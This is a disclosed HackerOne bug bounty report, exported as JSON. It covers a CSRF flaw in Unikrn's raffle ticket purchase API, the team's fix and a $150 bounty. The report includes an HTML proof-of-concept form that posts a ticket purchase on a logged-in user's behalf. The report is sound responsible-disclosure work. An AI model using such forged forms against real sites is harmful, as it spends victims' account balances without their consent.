{"id":272588,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzI1ODg=","url":"https://hackerone.com/reports/272588","title":"CSRF in Raffles Ticket Purchasing","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-09-28T04:08:10.330Z","submitted_at":"2017-09-28T04:08:10.330Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tolo7010","url":"/tolo7010","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2672,"url":"https://hackerone.com/unikrn","handle":"unikrn","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Unikrn","twitter_handle":"unikrnco","website":"https://unikrn.com","about":"Win prizes, bet safely and legally on esports and get the best multi-title coverage for fans and fanatics alike!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-04-10T02:10:08.175Z","bug_reporter_agreed_on_going_public_at":"2018-04-10T01:04:32.905Z","team_member_agreed_on_going_public_at":"2018-04-10T02:10:08.075Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Description:\n========\n\nAn API endpoint get executed with no CSRF prevention, the endpoint did not verify session_id required in the post form. An attacker can crafted malicious form (Poc), which is executed by authenticated user action leading to huge balance lost.\n\nPoc:\n===\n\n\u003c!doctype html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n\u003c/head\u003e \n\u003cbody\u003e\n\u003cform action=\"https://unikrn.com/apiv2/raffle/enter\" method=\"POST\" name=\"myForm\"\u003e\n\u003cinput type=\"hidden\" name=\"raffle\" id=\"raffle\" value=\"4775\"\u003e\n\u003cinput type=\"hidden\" name=\"tickets\" id=\"tickets\" value=\"1\"\u003e\n\u003cinput type=\"hidden\" name=\"session_id\" id=\"session_id\" value=\"\"\u003e\n\u003cinput value=\"Submit\" type=\"submit\"\"\u003e\n\u003c/form\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n\nRecommendations:\n=============\n\n- Implementing CSRF tokens.\n- Validate session_id on post form/JSON api input.","vulnerability_information_html":"\u003ch1 id=\"description\"\u003eDescription:\u003c/h1\u003e\n\n\u003cp\u003eAn API endpoint get executed with no CSRF prevention, the endpoint did not verify session_id required in the post form. An attacker can crafted malicious form (Poc), which is executed by authenticated user action leading to huge balance lost.\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePoc:\u003c/h1\u003e\n\n\u003cp\u003e\u0026lt;!doctype html\u0026gt;\u003cbr\u003e\n\u0026lt;html\u0026gt;\u003cbr\u003e\n\u0026lt;head\u0026gt;\u003cbr\u003e\n\u0026lt;/head\u0026gt; \u003cbr\u003e\n\u0026lt;body\u0026gt;\u003cbr\u003e\n\u0026lt;form action=\u0026quot;https://unikrn.com/apiv2/raffle/enter\u0026quot; method=\u0026quot;POST\u0026quot; name=\u0026quot;myForm\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;raffle\u0026quot; id=\u0026quot;raffle\u0026quot; value=\u0026quot;4775\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;tickets\u0026quot; id=\u0026quot;tickets\u0026quot; value=\u0026quot;1\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;session_id\u0026quot; id=\u0026quot;session_id\u0026quot; value=\u0026quot;\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;input value=\u0026quot;Submit\u0026quot; type=\u0026quot;submit\u0026quot;\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;/form\u0026gt;\u003cbr\u003e\n\u0026lt;/body\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n\n\u003ch1 id=\"recommendations\"\u003eRecommendations:\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eImplementing CSRF tokens.\u003c/li\u003e\n\u003cli\u003eValidate session_id on post form/JSON api input.\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"150.0","formatted_bounty":"$150","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-05-10T01:04:32.974Z","allow_singular_disclosure_after":-83304909.34017667,"singular_disclosure_allowed":true,"vote_count":19,"voters":["jokebookservice1","jensec","foobar7","muon4","emitrani","tolo7010","michan","eveeez","r3y","an0nym0us","and 9 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":453,"asset_type":"URL","asset_identifier":"unikrn.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2029690,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Where would you get the session id from ?","markdown_message":"\u003cp\u003eWhere would you get the session id from ?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-28T12:19:20.354Z","updated_at":"2017-09-28T12:19:20.354Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2029691,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"ahh \" did not verify session_id required\" sorry.","markdown_message":"\u003cp\u003eahh \u0026quot; did not verify session_id required\u0026quot; sorry.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-28T12:19:43.851Z","updated_at":"2017-09-28T12:19:43.851Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2029752,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I left it blank intentionally, while many endpoints raise \"no_session\" error if no session / invalid session specified. This endpoint ignores it, takes cookie as authentication, and the cookie get to the server when visited.","markdown_message":"\u003cp\u003eI left it blank intentionally, while many endpoints raise \u0026quot;no_session\u0026quot; error if no session / invalid session specified. This endpoint ignores it, takes cookie as authentication, and the cookie get to the server when visited.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-28T12:45:04.406Z","updated_at":"2017-09-28T12:45:04.406Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2035034,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please let me know if any updates available, thanks.\n\nRegards.","markdown_message":"\u003cp\u003ePlease let me know if any updates available, thanks.\u003c/p\u003e\n\n\u003cp\u003eRegards.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-30T03:02:36.161Z","updated_at":"2017-09-30T03:02:36.161Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2046957,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi, took a while to check all endpoints and have a more general solution in place. Can you confirm its fixed? \nThx for the report?","markdown_message":"\u003cp\u003eHi, took a while to check all endpoints and have a more general solution in place. Can you confirm its fixed? \u003cbr\u003e\nThx for the report?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-05T15:40:13.664Z","updated_at":"2017-10-05T15:40:13.664Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"tolo7010","url":"/tolo7010"},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2047069,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"the reproduction doesnot work anymore. fixed confirmed","markdown_message":"\u003cp\u003ethe reproduction doesnot work anymore. fixed confirmed\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-05T16:10:31.145Z","updated_at":"2017-10-05T16:10:31.145Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2047089,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-05T16:16:35.581Z","updated_at":"2017-10-05T16:16:35.581Z","actor":{"url":"/unikrn","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Unikrn"}},"bounty_amount":"150.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"unikrn","collaborator":{"username":"tolo7010","url":"/tolo7010"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2047146,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"thanks for the bounty!\n\nRegards","markdown_message":"\u003cp\u003ethanks for the bounty!\u003c/p\u003e\n\n\u003cp\u003eRegards\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-05T16:44:58.535Z","updated_at":"2017-10-05T16:44:58.535Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2584396,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-10T01:04:32.938Z","updated_at":"2018-04-10T01:04:32.938Z","first_to_agree":true,"actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2584491,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thx again tololovejoi","markdown_message":"\u003cp\u003eThx again tololovejoi\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-10T02:10:08.107Z","updated_at":"2018-04-10T02:10:08.107Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2584492,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-10T02:10:08.201Z","updated_at":"2018-04-10T02:10:08.201Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}